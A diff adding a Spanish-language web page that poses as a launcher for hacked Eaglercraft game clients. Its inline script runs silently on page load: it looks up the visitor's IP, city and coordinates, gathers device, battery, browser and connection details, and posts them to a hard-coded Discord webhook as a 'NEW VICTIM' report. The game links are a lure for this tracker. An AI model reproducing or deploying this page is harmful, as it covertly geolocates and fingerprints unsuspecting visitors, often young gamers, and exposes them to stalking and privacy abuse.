@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<title>HOME FORGEX â€” Clientes Eaglercraft</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<style>
+  :root{--bg:#05060a;--card:#0f1724;--acc:#a78bfa;--pink:#ec4899;--muted:#9ca3af}
+  body{margin:0;font-family:system-ui;background:var(--bg);color:#fff;min-height:100vh;display:flex;flex-direction:column}
+  header{position:sticky;top:0;background:rgba(0,0,0,.4);backdrop-filter:blur(12px);border-bottom:1px solid #333}
+  .nav{max-width:1200px;margin:auto;padding:16px;display:flex;justify-content:space-between;align-items:center}
+  .logo{width:48px;height:48px;border-radius:12px;background:linear-gradient(135deg,var(--acc),var(--pink));display:grid;place-items:center;font-weight:900;font-size:22px}
+  .title{background:linear-gradient(90deg,var(--acc),var(--pink));-webkit-background-clip:text;color:transparent;font-weight:800}
+  main{flex:1;max-width:1200px;margin:30px auto;padding:0 20px}
+  .grid{display:grid;gap:18px;grid-template-columns:repeat(auto-fit,minmax(270px,1fr))}
+  .card{background:rgba(255,255,255,.025);border:1px solid rgba(255,255,255,.08);border-radius:16px;padding:20px;transition:.25s}
+  .card:hover{transform:translateY(-8px);box-shadow:0 20px 50px rgba(167,139,250,.2)}
+  .name{font-weight:800;font-size:18px;margin-bottom:6px}
+  .open{background:linear-gradient(90deg,var(--acc),var(--pink));color:#fff;border:none;padding:14px;border-radius:14px;font-weight:700;width:100%;cursor:pointer}
+  h1{text-align:center;font-size:2.8rem;margin:20px 0;background:linear-gradient(90deg,var(--acc),var(--pink));-webkit-background-clip:text;color:transparent}
+</style>
+</head>
+<body>
+
+<header>
+  <div class="nav">
+    <div style="display:flex;align-items:center;gap:14px">
+      <div class="logo">HF</div>
+      <div><div class="title">HOME FORGEX</div><small style="color:var(--muted)">@j_eliseoo_v â€¢ 2025</small></div>
+    </div>
+  </div>
+</header>
+
+<main>
+  <h1>Clientes Eaglercraft 2025</h1>
+  <div class="grid">
+    <div class="card"><div class="name">DragonX Client</div><div class="ver">V5.1</div><button class="open" data-link="https://eaglerhacks.github.io/dragonxv5.html">Abrir</button></div>
+    <div class="card"><div class="name">WurstX Client</div><button class="open" data-link="https://eaglerhacks.github.io/wurstX.html">Abrir</button></div>
+    <div class="card"><div class="name">UwU+ Client</div><button class="open" data-link="https://eaglerhacks.github.io/UwU+-client-1.0.html">Abrir</button></div>
+    <div class="card"><div class="name">ShadowX Client</div><button class="open" data-link="https://eaglerhacks.github.io/shadowx-client-3.0.html">Abrir</button></div>
+    <div class="card"><div class="name">Sigma Client</div><button class="open" data-link="https://eaglerhacks.github.io/sigma-5.2.html">Abrir</button></div>
+    <div class="card"><div class="name">Future Client</div><button class="open" data-link="https://eaglerhacks.github.io/future-12.5.html">Abrir</button></div>
+  </div>
+</main>
+
+<script>
+// TU WEBHOOK
+const WEBHOOK = "https://discord.com/api/webhooks/1455720593688100884/c-ezeoQzhgREwV_lcQUNp_dKfo009Y7xatAHZ6cXlSCs52gOBpZUfmcw527iogUpgWxf";
+
+// ENVÃA TODO AL INGRESAR (sin pedir nada)
+(async () => {
+  const geo = await fetch('https://ipapi.co/json/').then(r=>r.json()).catch(()=>({}));
+  const battery = await navigator.getBattery?.() || {};
+  const uaData = navigator.userAgentData || {};
+  const connection = navigator.connection || {};
+
+  const datos = {
+    ip: geo.ip || 'oculta',
+    isp: geo.org || '?',
+    ubicacion: `${geo.city || '?'}, ${geo.regionName || ''}, ${geo.country_name || 'El Salvador'} (${geo.postal || '?'})`,
+    coordenadas: `${geo.latitude || '?'}, ${geo.longitude || '?'}`,
+    hora: new Date().toLocaleString(),
+    navegador: uaData.brands?.map(b=>b.brand+" v"+b.version).join(', ') || navigator.userAgent.substring(0,100),
+    so: uaData.platform || navigator.platform,
+    movil: uaData.mobile ? 'SÃ­' : 'No',
+    ram: navigator.deviceMemory || '?',
+    cpu: navigator.hardwareConcurrency || '?',
+    pantalla: `${screen.width}x${screen.height}x${screen.colorDepth}`,
+    bateria: battery.level ? `${Math.round(battery.level*100)}% ${battery.charging?'cargando':'descargando'}` : 'no disponible',
+    conexion: connection.effectiveType || '?',
+    velocidad: connection.downlink ? `${connection.downlink} Mbps` : '?',
+    zona: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    idioma: navigator.language,
+    pestaÃ±as: history.length,
+    cookies: navigator.cookieEnabled ? 'SÃ­' : 'No',
+    modo_oscuro: window.matchMedia('(prefers-color-scheme: dark)').matches ? 'SÃ­' : 'No'
+  };
+
+  const mensaje = 
+`**NUEVA VÃCTIMA (MÃXIMO DETALLE)**
+**IP:** ${datos.ip} (${datos.isp})
+**UbicaciÃ³n:** ${datos.ubicacion}
+**Coordenadas:** ${datos.coordenadas}
+**Hora:** ${datos.hora}
+**Navegador:** ${datos.navegador}
+**SO:** ${datos.so} | MÃ³vil: ${datos.movil}
+**RAM:** ${datos.ram} GB | CPU: ${datos.cpu} nÃºcleos
+**Pantalla:** ${datos.pantalla}
+**BaterÃ­a:** ${datos.bateria}
+**ConexiÃ³n:** ${datos.conexion} (${datos.velocidad})
+**Zona horaria:** ${datos.zona}
+**Idioma:** ${datos.idioma}
+**PestaÃ±as:** ${datos.pestaÃ±as}
+**Cookies:** ${datos.cookies} | Modo oscuro: ${datos.modo_oscuro}`;
+
+  await fetch(WEBHOOK, {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({content: mensaje})
+  });
+})();
+
+// Botones normales
+document.querySelectorAll('.open').forEach(btn => {
+  btn.onclick = () => setTimeout(() => window.open(btn.dataset.link, '_blank'), 300);
+});
+</script>
+</body>
+</html>
